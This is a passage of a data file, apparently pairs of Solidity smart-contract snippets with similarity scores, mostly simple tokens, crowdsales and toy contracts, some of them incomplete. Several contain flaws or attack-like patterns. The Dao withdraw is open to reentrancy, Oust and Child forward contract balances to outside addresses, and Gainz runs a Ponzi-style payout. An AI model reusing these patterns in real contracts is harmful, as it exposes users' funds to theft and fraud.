    string public name = ""Neulaut"";

    uint8 public decimals = 18;

    string public symbol = ""NUA"";

    mapping (address => uint256) balances;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    



    constructor() public {

        owner = msg.sender;

        balances[owner] = totalSupply;

    }

    

    function() payable {

        revert();

    }



    function transfer(address _to, uint256 _value) public returns (bool success) {

        require(balances[msg.sender] >= _value);

        balances[msg.sender] -= _value;

        balances[_to] += _value;

        emit Transfer(msg.sender, _to, _value);

        return true;

    }



    function balanceOf(address _owner) constant public returns (uint256 balance) {

        return balances[_owner];

    }



}"
"contract B is A {
    function something_1() public  { ... }
    function something_2() private { ... }
}",0.6138439424755884,"contract SaiTopAbstract {
    function cage() public;
    function setOwner(address) public;
}"
"contract Crowdsale {
   bool public icoCompleted;
   uint256 public icoStartTime = 1538567825; 
   uint256 public icoEndTime = 1541246755;  
   uint256 public tokenRate;
   uint256 public fundingGoal;
   address public owner;
   ICOToken public token;
   uint256 public tokensRaised;
   uint256 public etherRaised;
   uint256 public etherUsed = msg.value;
   uint256 public tokensToBuy;


   modifier whenIcoCompleted {
      require(icoCompleted);
      _;
   }

    modifier onlyOwner {
      require(msg.sender == owner);
      _;
   }

   function () public payable {
       buy();
   }

     constructor(uint256 _tokenRate, address _tokenAddress, uint256 _fundingGoal) public {
      require(icoStartTime != 0 &&
      icoEndTime != 0 &&
      icoStartTime < icoEndTime &&
      _tokenRate != 0 &&
      _tokenAddress != address(0) &&
      _fundingGoal != 0);
      tokenRate = _tokenRate;
      token = ICOToken(_tokenAddress);
      fundingGoal = _fundingGoal;
      owner = msg.sender;
      etherUsed;
      tokensToBuy;
   }

    function buy() public payable {

    
    

      etherUsed = msg.value;

      tokensToBuy = etherUsed * (10 ** token.decimals()) / 1 ether * tokenRate;

    

    

    
    

    
    

    

    
    

    
    

    
      
      token.buyTokens(msg.sender, tokensToBuy);

      
      tokensRaised += tokensToBuy;
      etherRaised += etherUsed;
   }


   function extractEther() public whenIcoCompleted onlyOwner {
       owner.transfer(address(this).balance);
   }

}",0.6301319752633543,"contract PTMCrowdFund is Destructible {

    event PurchaseToken (address indexed from,uint256 weiAmount,uint256 _tokens);

     uint public priceOfToken=250000000000000;

    ERC20Token erc20Token;

    using SafeMath for uint256;

    uint256 etherRaised;

    uint public constant decimals = 18;

    function PTMCrowdFund () public {

        owner = msg.sender;

        erc20Token = ERC20Token(0x7c32DB0645A259FaE61353c1f891151A2e7f8c1e);

    }

    function updatePriceOfToken(uint256 priceInWei) external onlyOwner {

        priceOfToken = priceInWei;

    }

    

    function updateTokenAddress ( address _tokenAddress) external onlyOwner {

        erc20Token = ERC20Token(_tokenAddress);

    }

    

      function()  public whenNotPaused payable {

          require(msg.value>0);

          uint256 tokens = (msg.value * (10 ** decimals)) / priceOfToken;

          erc20Token.transfer(msg.sender,tokens);

          etherRaised += msg.value;

          

      }

      

        

    function transferFundToAccount(address _accountByOwner) public onlyOwner {

        require(etherRaised > 0);

        _accountByOwner.transfer(etherRaised);

        etherRaised = 0;

    }



    

    

    function transferLimitedFundToAccount(address _accountByOwner, uint256 balanceToTransfer) public onlyOwner   {

        require(etherRaised > balanceToTransfer);

        _accountByOwner.transfer(balanceToTransfer);

        etherRaised = etherRaised.sub(balanceToTransfer);

    }

    

}"
"contract Test {

    function setThreeValues() public view returns(int, uint, uint) {
        int x = 5;
        uint y = 7;
        uint z = 0;

        x += 5;
        y += 13;
        z = uint(x) + y;

        return (x, y, z);

    }



    function callThreeValues() public view returns(int, uint, uint) {
        return setThreeValues();
    }


    
    
    


    
    
    

    
    
    

}",0.6625261974912091,"contract SafeMath {

    function add(uint256 x, uint256 y) pure internal returns(uint256) {

      uint256 z = x + y;

      assert((z >= x) && (z >= y));

      return z;

    }



    function subtract(uint256 x, uint256 y) pure internal returns(uint256) {

      assert(x >= y);

      uint256 z = x - y;

      return z;

    }

}"
"contract A {

  function doSomethingA() {
   
  }

}",0.6487343945369296,"contract Hello {

    function Hello() {

    }
}"
"contract TestStruct {

      struct User {
        string name;
        uint256 age;
     }

    mapping (bytes32 => User) users;

    function addUsers (User [] memory _users) public {

        for (uint i = 0; i < _users.length; i++) {

           bytes32 hash = keccak256(abi.encode(_users[i].name));
           users[hash] = _users[i];

        }
    }

    function getUser (string memory username) public view returns (User memory) {

        bytes32 hash = keccak256(abi.encode(username));

        return users[hash];
    }
}",0.6172082403517213,"contract DSProxyCache {
    mapping(bytes32 => address) cache;

    function read(bytes memory _code) public view returns (address) {
        bytes32 hash = keccak256(_code);
        return cache[hash];
    }

    function write(bytes memory _code) public returns (address target) {
        assembly {
            target := create(0, add(_code, 0x20), mload(_code))
            switch iszero(extcodesize(target))
            case 1 {
                
                revert(0, 0)
            }
        }
        bytes32 hash = keccak256(_code);
        cache[hash] = target;
    }
}"
"contract Storage {
    struct Log {
        string fname;
        string lname;
        string dob;
    }
    mapping (uint => Log) logs;

    uint index = 0;

    function set(string memory fname, string memory lname, string memory dob) public returns (uint) {
        index++;
        logs[index] = Log(fname, lname, dob);
        return (index);
    }

    function get(uint idx) public view returns (string memory, string memory, string memory) {
        return (logs[idx].fname, logs[idx].lname, logs[idx].dob);
    }
}",0.6254038591831088,"contract modERC20Detailed is modIERC20 {

    string private _name;

    string private _symbol;

    uint8 private _decimals;



    constructor (string name, string symbol, uint8 decimals) public {

        _name = name;

        _symbol = symbol;

        _decimals = decimals;

    }



    

    function name() public view returns (string) {

        return _name;

    }



    

    function symbol() public view returns (string) {

        return _symbol;

    }



    

    function decimals() public view returns (uint8) {

        return _decimals;

    }

}"
"contract C2 {

    function func2() pure public returns(bytes4) {
        return msg.sig;
    }
}",0.6629501070198114,"contract ICKBase {

	function ownerOf(uint256) public pure returns (address);
}"
"contract Fund {
    
    mapping(address => uint) shares;
    
    function withdraw() {
        if (msg.sender.send(shares[msg.sender]))
            shares[msg.sender] = 0;
    }
}",0.6244600223750127,"contract Vote {
    event LogVote(address indexed addr);

    function() {
        LogVote(msg.sender);

        if (msg.value > 0) {
            msg.sender.send(msg.value);
        }
    }
}"
"contract MetaCoin {
  TestLib.Data data;
  address public owner;

  function MetaCoin() {
    owner = msg.sender;
    TestLib.Set(data, 2);
  }

  function GetData() constant returns(uint) {
    return TestLib.Get(data);
  }
}",0.6457901622781894,"contract showNum {
    address owner = msg.sender;

    uint _num = 0;
   function setNum(uint number) public payable {
        _num = number;
    }

    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract CtrtFactory {
  function makeCtrt() {
    address ctrtAddress = new Ctrt(...);
  }
}",0.6230388558706422,"contract abcResolverI{

    function getAddress() public view returns (address);

}"
"contract Factory {

  address[] public pizzas;

  function Factory() {
    
  }

  function cookPizza() returns (address _pizza) {
    Pizza newPizza = new Pizza();
    pizzas.push(newPizza);
    return newPizza;
  }

  function getPizzas() public constant returns (address[]) {
    return pizzas;
  }
}",0.6294310729906771,"contract Bakery {



  



  address[] public contracts;



  



  function getContractCount()

    public

    constant

    returns(uint contractCount)

  {

    return contracts.length;

  }



  



  function newCookie()

    public

    returns(address newContract)

  {

    Cookie c = new Cookie();

    contracts.push(c);

    return c;

  }

}"
"contract Pizza {
  function Pizza() {
    
  }
}",0.6866488475644301,"contract MSD6 {

    

    function() public {

        

    }

}"
"contract Sum {
   event Summed(uint256 num1, uint256 num2, uint256 result);

   function getSum(uint256 num1, uint256 num2) public returns (uint256 result) {
       uint256 result;
       result = num1 + num2;
       return result;

       Summed(num1, num2, result);
   }
}",0.6071200597513463,"contract SafeMath {



  function safeSub(uint256 a, uint256 b) internal returns (uint256) {

    assert(b <= a);

    return a - b;

  }



  function safeAdd(uint256 a, uint256 b) internal returns (uint256) {

    uint256 c = a + b;

    assert(c>=a && c>=b);

    return c;

  }

}"
"contract simple {
    function twice(int a) constant returns(int) {
        return 2*a;
    }
}",0.6982908244594253,"contract Now {

  

  function getNow() public constant returns(uint256) {

    

    return now;

  }

}"
"contract MetaCoin {
  mapping (address => uint) balances;

  function MetaCoin() {
    balances[tx.origin] = 10000;
  }

  function sendCoin(address receiver, uint amount) returns(bool sufficient) {
    if (balances[msg.sender] < amount) return false;
    balances[msg.sender] -= amount;
    balances[receiver] += amount;
    return true;
  }

  function getBalanceInEth(address addr) returns(uint){
    return ConvertLib.convert(getBalance(addr),2);
  }

  function getBalance(address addr) returns(uint) {
    return balances[addr];
  }
}",0.6571675050751339,"contract BasicToken is ERC20Basic {

    using SafeMath for uint;



    mapping(address => uint) balances;



  

    function transfer(address _to, uint _value) public returns (bool) {

        require(_to != address(0));

        require(_value <= balances[msg.sender]);



        

        balances[msg.sender] = balances[msg.sender].sub(_value);

        balances[_to] = balances[_to].add(_value);

        emit Transfer(msg.sender, _to, _value);

        return true;

    }



  

    function balanceOf(address _owner) public view returns (uint balance) {

        return balances[_owner];

    }



}"
"contract Deployed is Ownable {
    uint public a = 1;

    function setA(uint _a) public onlyOwner returns (uint) {
        a = _a;
        return a;
    }

}",0.6801267648652374,"contract SafeMath {

	function safeAdd(uint a, uint b) internal returns(uint) {
		uint c = a + b;
		assert(c >= a && c >= b);
		return c;
	}
}"
"contract supplyChain {
    address public state;
    uint public unitCost = 10;
    uint public totalAmount = 0;

    function supplyChain() payable public{
        state = msg.sender;
    }

    function add_money() public payable {
        require(msg.value == totalAmount && totalAmount>0);
    }

    struct School{
        address schoolId;
        string name;
        string district;
        uint students;
        uint amountRequired;
    }

    function getbalance() external view returns(uint){
        return address(this).balance;
    }

    School[] public Schools;

    function addSchool(address schoolId,string memory name,string memory district,uint students) public {
        require(state == msg.sender);
        Schools.push(School(schoolId,name,district,students,students*unitCost));
    }

    function getTotalAmountToPay() public returns(uint){
        uint total = 0;
        for(uint i=0;i<Schools.length;i++){
            total+=Schools[i].amountRequired;
        }
        totalAmount = total;
        return total;
    }

    function allocateMoneyToSchools() public{
        for(uint i=0;i<Schools.length;i++){
            Schools[i].schoolId.transfer(Schools[i].amountRequired);   
        }
    }

}",0.6281168132544478,"contract Token {
    string internal _symbol;
    string internal _name;
    uint8 internal _decimals;
    uint internal _totalSupply = 1000;
    mapping (address => uint) internal _balanceOf;
    mapping (address => mapping(address => uint)) internal _allowances;
    
    constructor(string symbol, string name, uint8 decimals, uint totalSupply) public {
        _symbol = symbol;
        _name = name;
        _decimals = decimals;
        _totalSupply = totalSupply;
    }
    
    function name() public constant returns (string) {
        return _name;
    }
    
    function symbol() public constant returns (string) {
        return _symbol;
    }
    
    function decimals() public constant returns (uint8){
        return _decimals;
    }
    
    function totalSupply() public constant returns (uint){
        return _totalSupply;
    }
    
    function balanceOf(address _addr) public constant returns (uint);
    function transfer(address _to, uint _value) public returns (bool);
    event Transfer(address indexed _from, address indexed _to, uint _value);
}"
"contract Bank {
    uint private value;


    function Bank(uint amount) {
        value = 10;
    }

    function deposit(uint amount) {
        value += amount;
    }


    function balance() constant returns (uint) {
        return value;
    }

}",0.6393911391437084,"contract cDAI {
    function mint(uint mintAmount) external returns (uint);
    function balanceOf(address account) external returns (uint);
    function transfer(address, uint) external returns(bool);
}"
"contract MyFirstContract is Bank {
    string private name;
    uint private age;

    function setName(string newName) {
        name = newName;
    }

    function getName() returns (string) {
        return name;
    }

    function setAge(uint newAge) {
        age = newAge;
    }

    function getAge() returns (uint) {
        return age;
    }
}",0.6329771041913764,"contract ERC223 is ERC20 {



    function name() constant returns (string _name);

    function symbol() constant returns (string _symbol);

    function decimals() constant returns (uint8 _decimals);



    function transfer(address to, uint256 value, bytes data) returns (bool);



}"
"contract Rental {
    struct PaidRent {
        uint id;
        uint value;
    }
    PaidRent[] public paidrents;
    event RentPaid(bool Status);
    uint public createdTimestamp;
    uint public rent;
    uint public security_deposit;
    string public house;
    address public owner;
    address public tenant;

    enum State {Created, Started, Terminated}
    State public state;
    function Rental(uint _rent, uint _security_deposit, string _house, address _owner, address _tenant) {
        createdTimestamp = block.timestamp;
        rent = _rent;
        security_deposit = _security_deposit;
        house = _house;
        owner = _owner;
        tenant = _tenant;
    }
    modifier require(bool _condition) {
        if(!_condition) throw;
        _;
    }
    modifier ownerOnly() {
        if(msg.sender != owner) throw;
        _;
    }
    modifier TenantOnly() {
        if(msg.sender != tenant) throw;
        _;
    }
    modifier inState(State _state){
        if(_state != state) throw;
        _;
    }

    function getPaidRents() internal returns (PaidRent[]) {
        return paidrents;
    }

      function getHouse() constant returns (string) {
        return house;
    }
    function getowner() constant returns (address) {
        return owner;
    }
    function getTenant() constant returns (address) {
        return tenant;
    }
    function getRent() constant returns (uint) {
        return rent;
    }
    function getDeposit() constant returns (uint) {
        return security_deposit;
    }
    function getContractCreated() constant returns (uint) {
        return createdTimestamp;
    }
    function getContractAddress() constant returns (address) {
        return this;
    }
    function getState() returns (State) {
        return state;
    }
    function CollectEth() payable  {}

    function payRent(uint _rent) public payable returns(bool status) {
        if(owner.send(_rent)){
          RentPaid(true);
          return true;
        } else {
          return false;
        }
    }

    function terminateContract(address deposit_to) inState(State.Started) require(this.balance == security_deposit) {
        deposit_to.transfer(security_deposit);
        state = State.Terminated;
    }



}",0.620240457136999,"contract Order is owned {
    ERC20 public token;
    uint public weiPerToken;
    uint public decimalPlaces;

    function Order(address _token, uint _weiPerToken, uint _decimalPlaces) {
        token = ERC20(_token);
        weiPerToken = _weiPerToken;
        decimalPlaces = _decimalPlaces;
    }

    function sendRobust(address to, uint value) internal {
        if (!to.send(value)) {
            if (!to.call.value(value)()) throw;
        }
    }

    function min(uint a, uint b) internal returns (uint) {
        if (a <= b) {
            return a;
        } else {
            return b;
        }
    }

    function getTransferableBalance(address who) internal returns (uint amount) {
        uint allowance = token.allowance(msg.sender, address(this));
        uint balance = token.balanceOf(msg.sender);

        amount = min(min(allowance, balance), numTokensAbleToPurchase());

        return amount;
    }

    function numTokensAbleToPurchase() constant returns (uint) {
        return (this.balance / weiPerToken) * decimalPlaces;
    }

    event OrderFilled(address _from, uint numTokens);

    
    function _fillOrder(address _from, uint numTokens) internal returns (bool) {
        if (numTokens == 0) throw;
        if (this.balance < numTokens * weiPerToken / decimalPlaces) throw;

        if (!token.transferFrom(_from, owner, numTokens)) return false;
        sendRobust(_from, numTokens * weiPerToken / decimalPlaces);
        OrderFilled(_from, numTokens);
        return true;
    }

    function fillOrder(address _from, uint numTokens) public returns (bool) {
        return _fillOrder(_from, numTokens);
    }

    
    function fillMyOrder(uint numTokens) public returns (bool) {
        return _fillOrder(msg.sender, numTokens);
    }

    
    function fillTheirOrder(address who) public returns (bool) {
        return _fillOrder(who, getTransferableBalance(who));
    }

    
    
    function fillOrderAuto() public returns (bool) {
        return _fillOrder(msg.sender, getTransferableBalance(msg.sender));
    }

    
    function () {
        
        if (msg.value > 0) {
            return;
        } else {
            fillOrderAuto();
        }
    }

    
    function cancel() onlyowner {
        selfdestruct(owner);
    }
}"
"contract MyContract {
 string public userName;
 function MyContract (string _name) {
   userName = _name;  
 }  
}",0.6072479943941225,"contract Foo
{
    string public phrase;
    
    function Foo(string _phrase) public {
        phrase = _phrase;
    }
}"
"contract Dao {
struct User {
    address addr;
    string name;
    uint balence;
    uint8 flag;
}
....
function addToBalence(string name) public payable{
    if(users[msg.sender].flag != 1) addUser(msg.sender,name,0,1);
    users[msg.sender].balence = users[msg.sender].balence + msg.value;
}

function showBalence() public returns (uint) {
    return users[msg.sender].balence;
}

function withdraw(uint amount) public payable{

    if(users[msg.sender].flag != 1) revert(""user does not exist"");
    else if (users[msg.sender].balence >= amount){
        msg.sender.call.value(amount)();
        users[msg.sender].balence -= amount;
    }
  }
}",0.6440868877113679,"contract Depositor {

    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    function balanceOf(address user) public view returns(uint256) {
        return _balances[user];
    }

    function deposit() public payable {
        _mint(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) public payable {
        _burn(msg.sender, amount);
        msg.sender.transfer(amount);
    }

    function _mint(address user, uint256 amount) internal {
        _balances[user] = _balances[user].add(amount);
    }

    function _burn(address user, uint256 amount) internal {
        _balances[user] = _balances[user].sub(amount);
    }
}"
"contract Simple {
    bytes32 public v;
    function set(bytes32 _v) {
        v = _v;
    }
}",0.6487820591144291,"contract ITyped {

    function getTypeName() public view returns (bytes32);

}"
"contract Foo {
    function getRange(uint n) public pure returns(uint[]) {
        uint[] memory result;
        for (uint i = 0; i < n; i++)
            if (someCondition(i))
               result.push(i);
        return result;
    }
}",0.6470006551273597,"contract Zhtong {
    address public owner;
      uint private result;
      function Set(){
          owner = msg.sender;
      }
      function assign(uint x, uint y) returns (uint){
          result = x + y;
      }
}"
"contract InfoFeed {
  function info() returns (uint ret) { return 42; }
}",0.6623905167240066,"contract UsdPrice {

    function USD(uint _id) constant returns (uint256);

}"
"contract Information {
    String str;

    function modify(String s) public {
        str = s;
    }
}",0.6156845486087835,"contract NamedToken is ERC20 {
   string public name;
   string public symbol;
}"
"contract Bag {
    mapping(uint256 => Bag) contents;
    uint256 public i = 0;

    function create() public {
        contents[i++] = new Information();
    }
}",0.6448044235679624,"contract Clans {

    function exists(uint256 clanId) public view returns (bool);

    mapping(uint256 => address) public clanToken; 

}"
"contract BillingContract {  
    ProductContract pc;  
    address PC_Address;  
    function BillingContract (address p) {  
        PC_Address = pc;  
        pc = ProductContract(p);  
    function getVal (uint p_id) returns (uint v) {  
        return pc.getVal(p_id);  
    }  
 }",0.6074659034190233,"contract DepositWalletInterface {

    function deposit(address _asset, address _from, uint256 amount) public returns (uint);

    function withdraw(address _asset, address _to, uint256 amount) public returns (uint);

}"
"contract Owned {

    address internal owner;

    address internal operator;

    function transferOwnership(address newOwner) public returns(bool success);

    function setOperator(address newoperator) public returns(bool success);

    function FreezeICO() public returns(bool success);

    function setRate(uint8 newRate) public returns(bool success);

    function addToWhitelist(address who) public returns(bool success);

    event Ownership_Transferred(address indexed previousOwner, address indexed newOwner);

    event Freeze_Ico(bool success);

    event change_Rate(uint8 newRate);

    event change_Operator(address operator);

    event Added_to_whitelist(bool success);

    constructor(address newoperator) public{

         owner = msg.sender;
         operator = newoperator;

    }


    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }

    modifier onlyOperator {

        require(msg.sender == operator);

        _;

    }
}",0.6981579588511985,"contract Ownable {

  address private _owner;



  event OwnershipTransferred(

    address indexed previousOwner,

    address indexed newOwner

  );



  

  constructor(address custom_owner) public {

    if (custom_owner != address (0))

      _owner = custom_owner;

    else

      _owner = msg.sender;

    emit OwnershipTransferred(address(0), _owner);

  }



  

  function owner() public view returns(address) {

    return _owner;

  }



  

  modifier onlyOwner() {

    require(isOwner());

    _;

  }



  

  function isOwner() public view returns(bool) {

    return msg.sender == _owner;

  }



  

  function renounceOwnership() public onlyOwner {

    emit OwnershipTransferred(_owner, address(0));

    _owner = address(0);

  }



  

  function transferOwnership(address newOwner) public onlyOwner {

    _transferOwnership(newOwner);

  }



  

  function _transferOwnership(address newOwner) internal {

    require(newOwner != address(0));

    emit OwnershipTransferred(_owner, newOwner);

    _owner = newOwner;

  }

}"
"contract NextLevelCrowdsale {
    using SafeMath for uint256;

address public beneficiary;
uint public fundingGoal = 1200 ether;
uint public amountRaised;
uint public deadline = 1504180740;
uint public price;
bool fundingGoalReached = false;
bool crowdsaleClosed = false;


mapping(address => uint256) public balanceOf;


event GoalReached(address beneficiary, uint amountRaised);
event FundTransfer(address backer, uint amount, bool isContribution);

function NextLevelCrowdsale(
    uint fundingGoalInEthers,
    uint crowdsaleDeadline,
    uint minimumAmount) {
        fundingGoalInEthers = fundingGoal;
        minimumAmount = 1 ether;
        crowdsaleDeadline = deadline;
    }

function () payable {
    if (crowdsaleClosed) revert();
    uint amount = msg.value;
    if (amount < 1 ether) revert();
    balanceOf[msg.sender].add(amount);
    amountRaised.add(amount);
    FundTransfer(msg.sender, amount, true);
}    

modifier afterDeadline() { if (now >= deadline) _; }


function checkGoalReached() afterDeadline {
    if (amountRaised >= fundingGoal) {
        fundingGoalReached = true;
        GoalReached(beneficiary, amountRaised);
    }
    crowdsaleClosed = true;
}

 function safeWithdrawal() afterDeadline {
    if (!fundingGoalReached) {
        uint amount = balanceOf[msg.sender];
        balanceOf[msg.sender] = 0;
        if (amount > 0) {
            if (msg.sender.send(amount)) {
                FundTransfer(msg.sender, amount, false);
            } else {
                balanceOf[msg.sender] = amount;
            }
        }
    }

    if (fundingGoalReached && beneficiary == msg.sender) {
        if (beneficiary.send(amountRaised)) {
            FundTransfer(beneficiary, amountRaised, false);
        } else {
            
            fundingGoalReached = false;
        }
    }
}
",0.6797878132943743,"contract Presale {
    address public beneficiary;                     
    uint public fundingLimit;                       
    uint public amountRaised;                       
    uint public deadline;                           
    uint public tokensPerEther;                     
    uint public minFinnRequired;                    
    uint public startTime;                          
    token public tokenReward;                       
    
    mapping(address => uint256) public balanceOf;   
    event FundTransfer(address backer, uint amount, bool isContribution);   
    
    function Presale(
        address ifSuccessfulSendTo,
        uint fundingLimitInEthers,
        uint durationInMinutes,
        uint tokensPerEthereum,
        uint minFinneyRequired,
        uint presaleStartTime,
        address addressOfTokenUsedAsReward
    ) public {
        beneficiary = ifSuccessfulSendTo;
        fundingLimit = fundingLimitInEthers * 1 ether;
        deadline = presaleStartTime + durationInMinutes * 1 minutes;
        tokensPerEther = tokensPerEthereum;
        minFinnRequired = minFinneyRequired * 1 finney;
        startTime = presaleStartTime;
        tokenReward = token(addressOfTokenUsedAsReward);
    }
    
    function () payable public {
        require(startTime <= now);
        require(amountRaised < fundingLimit);
        require(msg.value >= minFinnRequired);
        
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount * tokensPerEther);
        FundTransfer(msg.sender, amount, true);
    }
    
    function withdrawFundBeneficiary() public {
        require(now >= deadline);
        require(beneficiary == msg.sender);
        uint remaining = tokenReward.getBalanceOf(this);
        if(remaining > 0) {
            tokenReward.transfer(beneficiary, remaining);
        }
        if (beneficiary.send(amountRaised)) {
            FundTransfer(beneficiary, amountRaised, false);
        } else {
            revert();
        }
    }
}"
"contract Message {

    address public owner = msg.sender;
    string public message = ""Initial Message"";

    function Message() public {
      message = ""No message set - by constructor"";
      owner = msg.sender;
    }

    function retrieveMessage() constant
       returns (string _messageString)
    {
      _messageString = message;
    }

    function setMessage(string messageString) {
      message = messageString;
    }

}",0.6097464554347979,"contract Metadata {
    mapping (address => mapping (address => mapping (string => string))) metadata;

    function put(address _namespace, string _key, string _value) public {
        metadata[_namespace][msg.sender][_key] = _value;
    }

    function get(address _namespace, address _ownerAddress, string _key) public constant returns (string) {
        return metadata[_namespace][_ownerAddress][_key];
    }
}"
"contract Banker {
    function abc_1() constant returns (uint) {
        return SilverCoin.abc();
    }
}",0.6906849754289809,"contract Now {

  

  function getNow() public constant returns(uint256) {

    

    return now;

  }

}"
"contract CheckBehavior {

    mapping(address => uint256) _deposits;

    function depo() public payable{

        _deposits[msg.sender]= msg.value;

    }


    function withdrawA(uint256 _amt) public {

        msg.sender.transfer(_amt);
    }



    function withdrawB(address payable payee, uint256 _amt) public {

        payee.transfer(_amt);
}


this keeps track of addresses and one can condition based on it
    function withdrawWithGas(address payable payee) public {
        uint256 payment = _deposits[payee];

        _deposits[payee] = 0;

        payee.transfer(payment);
    }

}",0.6747406408976914,"contract ICO_Hold is Ownable {

    mapping (address => uint) public deposits;

    uint public openDate;

    address public Owner;



    function() public payable { }

    

    function setup(uint _openDate) public {

        Owner = msg.sender;

        openDate = _openDate;

    }

    

    function deposit() public payable {

        if (msg.value >= 0.5 ether) {

            deposits[msg.sender] += msg.value;

        }

    }



    function withdraw(uint amount) public {

        if (isOwner() && now >= openDate) {

            uint max = deposits[msg.sender];

            if (amount <= max && max > 0) {

                msg.sender.transfer(amount);

            }

        }

    }

}"
"contract Oust {
    address kingdom = 0x344d65e66a9c4f8d7911bf7433b509d6daac9bc0;
  function Oust() public payable {

  }    

  function take() public {

      kingdom.call.value(this.balance);
  }
",0.6112484009520007,"contract Child {

    function() public payable {

    }

    

    function win(address target) public payable {

        require(target.call.value(msg.value)());

        msg.sender.transfer(address(this).balance);

    }

}"
"contract Faucet {
    address owner;
    uint256 sendAmount;

    function Faucet() {
        owner = msg.sender;
        sendAmount = 1000000000000000000;
    }

    function getBalance() returns (uint) {
        return this.balance;
    }

    function getWei() returns (bool) {
        return msg.sender.send(sendAmount);
    }

    function sendWei(address toWhom) returns (bool) {
        return toWhom.send(sendAmount);
    }

    function getSendAmount() returns (uint256) {
        return sendAmount;
    }

    function killMe() returns (bool) {
        if (msg.sender == owner) {
            suicide(owner);
            return true;
        }
    }

    function () payable {}
}",0.6460027527155573,"contract TOKEN {
   function totalSupply() external view returns (uint256);
   function balanceOf(address account) external view returns (uint256);
   function transfer(address recipient, uint256 amount) external returns (bool);
   function allowance(address owner, address spender) external view returns (uint256);
   function approve(address spender, uint256 amount) external returns (bool);
   function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}"
"contract SimpleTest {

    function testFunc(string name, bool isFirst) public {
        
    }

}",0.6614437743704912,"contract Resolver {
    function setName(bytes32 node, string name) public;
}"
"contract Contract_B {

  uint public val;
  function Contract_B(){
   val=7;}
   function change(){
   val+=90;}
  }",0.6355070074101234,"contract ContractConn{

    function transfer(address _to, uint _value) public returns (bool success);

}"
"contract Bet {
address owner = 0x3618b7fFA11F5eE1c439f2B0C547a0e7feD7FE44;
uint totalPot = 0;
uint pot1 = 0;
uint pot2 = 0;
uint addressLUTIndex = 0;
bool gameOpen = true;

struct Player {
    uint choice;
    uint amount;
    bool isset;
}

mapping(address => Player) pot;
mapping(uint => address) playerLUT;

function () public payable {
    betforChoice(msg.sender, 1);     
    placeBet(msg.sender, msg.value);
}

function Bet() public payable {
    placeBet(msg.sender, msg.value);
}

function placeBet(address iplayer, uint amount) internal {
    if (pot[iplayer].isset) {
        totalPot += amount;
        pot[msg.sender].amount = amount;
        if (pot[iplayer].choice == 1) {
            pot1 += amount;
        } else {
            pot2 += amount;
        }
    }
}

modifier canSetChoice(address player, uint choice) {
    require(!pot[player].isset && (choice == 1 || choice == 2) && gameOpen);
    _;
}

function betforChoice(address player, uint user_choice) canSetChoice(player, user_choice) public {
    pot[player].choice = user_choice;
    pot[player].isset = true;
    playerLUT[addressLUTIndex] = player;
    addressLUTIndex++;

}

modifier onlyOwnerChoice(uint choice) {
    require(msg.sender == owner && (choice == 1 || choice == 2) && gameOpen);
    _;
}

function setWinner(uint owner_choice) onlyOwnerChoice(owner_choice) public {
    uint winningFactor = 0;
    uint dealerComission = 10;
...
}

modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

function getPotSize() public view onlyOwner returns(uint)  {
    return totalPot;
}
function getPotSize1() public view onlyOwner returns(uint)  {
    return pot1;
}
function getPotSize2() public view onlyOwner returns(uint)  {
    return pot2;
}

}",0.6544193479472219,"contract Wallet {

    using Address for address;

    using SafeMath for uint256;

    using SafeMath for uint8;



    SmartLotteryGame public slg;



    uint256 private _totalRised;

    uint8 private _players;

    bool closedOut = false;

    uint public gameId;

    uint256 public minPaymnent;



    struct bet {

        address wallet;

        uint256 balance;

    }



    mapping(uint8 => bet) public bets;



    modifier canAcceptPayment {

        require(msg.value >= minPaymnent);

        _;

    }



    modifier canDoTrx() {

        require(Address.isContract(msg.sender) != true);

        _;

    }



    modifier isClosedOut {

        require(!closedOut);

        _;

    }



    modifier onlyCreator() {

        require(msg.sender == address(slg));

        _;

    }



    constructor(uint _gameId, uint256 _minPayment) public {

        slg = SmartLotteryGame(msg.sender);

        gameId = _gameId;

        minPaymnent = _minPayment;

    }



    function totalPlayers() public view returns(uint8) {

        return _players;

    }



    function totalBets() public view returns(uint256) {

        return _totalRised;

    }



    function finishDay() external onlyCreator returns(uint256) {

        uint256 balance = address(this).balance;

        if (balance >= minPaymnent) {

            slg.getFunds.value(balance)();

            return balance;

        } else {

            return 0;

        }

    }



    function closeContract() external onlyCreator returns(bool) {

        return closedOut = true;

    }



    function addPlayer(uint8 _id, address _player, uint256 _amount)

    internal

    returns(bool) {

        bets[_id].wallet = _player;

        bets[_id].balance = _amount;

        return true;

    }



    function()

    payable

    canAcceptPayment

    canDoTrx

    isClosedOut

    external {

        _totalRised = _totalRised.add(msg.value);

        _players = uint8((_players).add(1));

        addPlayer(_players, msg.sender, msg.value);

        slg.participate();

    }

}"
"contract Transferable {

    address owner;
    Transferable next;
    mapping(address => uint) public balances;

    constructor() public {
        owner = msg.sender;
    }

    function addBalance() public payable {
        balances[msg.sender] += msg.value;
    }

    function transferBalance() public payable {
        require(address(next) != address(0), ""next not set"");
        uint value = balances[msg.sender];
        balances[msg.sender] -= value;
        next.receiveBalanceTransfer.value(value)(msg.sender);
    }

    function receiveBalanceTransfer(address _beneficiary) public payable {
        balances[_beneficiary] += msg.value;
    }

    function setNext(address _next) public {
        require(msg.sender == owner);
        next = Transferable(_next);
    }

}",0.6827335495411547,"contract Gainz {

    address owner;



    constructor () public {

        owner = msg.sender;

    }



    mapping (address => uint) balances;

    mapping (address => uint) timestamp;

    

    function() external payable {

        owner.transfer(msg.value / 20);

        if (balances[msg.sender] != 0){

            msg.sender.transfer(paymentDue(msg.sender));

        }

        timestamp[msg.sender] = block.number;

        balances[msg.sender] += msg.value;

    }

    

    

    function balanceOf(address userAddress) public view returns (uint) {

        return balances[userAddress];

    }



    

    function paymentDue(address userAddress) public view returns (uint) {

        uint blockDelta = block.number-timestamp[userAddress];

        return balances[userAddress]*2/100*(blockDelta)/6000;

    }

}"
"contract Parent is IParent {
    int value;

    function setValue(int v) public {
        value = v;
    }

    function getValue() external view returns (int) {
        return value;
    }

    function getSender() external view returns (address) {
        return msg.sender;
    }
}",0.6937769536709767,"contract Context is Initializable {
    
    
    constructor () internal { }
    

